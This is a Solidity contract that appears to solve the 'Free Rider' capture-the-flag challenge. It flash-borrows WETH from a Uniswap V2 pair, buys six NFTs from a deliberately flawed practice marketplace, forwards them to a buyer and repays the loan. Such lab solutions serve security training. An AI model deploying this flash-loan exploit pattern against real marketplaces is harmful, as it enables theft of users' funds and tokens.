// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "hardhat/console.sol";

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract FreeRiderAttacker is
    ReentrancyGuard,
    IERC721Receiver,
    IUniswapV2Callee
{
    IUniswapV2Pair immutable pair;
    IWETH immutable weth;
    IERC721 immutable nft;
    FreeRiderNFTMarketplace immutable marketplace;
    address immutable buyer;

    constructor(
        IUniswapV2Pair _pair,
        IWETH _weth,
        IERC721 _nftToken,
        FreeRiderNFTMarketplace _marketplace,
        address _buyer
    ) {
        pair = _pair;
        weth = _weth;
        nft = _nftToken;
        marketplace = _marketplace;
        buyer = _buyer;
    }

    function flashSwap(uint amount) external {
        bytes memory data = abi.encode(weth, amount);
        pair.swap(amount, 0, address(this), data);

        console.log("flashSwap successful");
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override nonReentrant {
        require(msg.sender == address(pair), "Not pair");
        require(sender == address(this), "Not sender");

        (address decodedAddress, uint amountDecoded) = abi.decode(
            data,
            (address, uint)
        );
        require(amountDecoded == amount0, "Amount0 NOK");
        require(decodedAddress == address(weth), "Not weth");

        /*-------- make use of flash loaned weth; buy nfts --------*/
        uint256 nftCount = 6;
        uint256[] memory nftIds = new uint256[](nftCount);

        for (uint i = 0; i < nftCount; i++) {
            nftIds[i] = uint256(i);
        }
        // exchange weth to eth
        weth.withdraw(amount0);
        marketplace.buyMany{value: amount0}(nftIds);

        //send nfts to buyer
        for (uint i = 0; i < nftCount; i++) {
            nft.safeTransferFrom(address(this), address(buyer), i);
        }

        /*-------- payback the loan --------*/
        // exchange eth to weth
        weth.deposit{value: amount0}();
        uint paybackAmount = (amount0 * 1000) / 997 + 1;

        bool sent = weth.transfer(address(pair), paybackAmount);
        require(sent, "weth not payed back");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
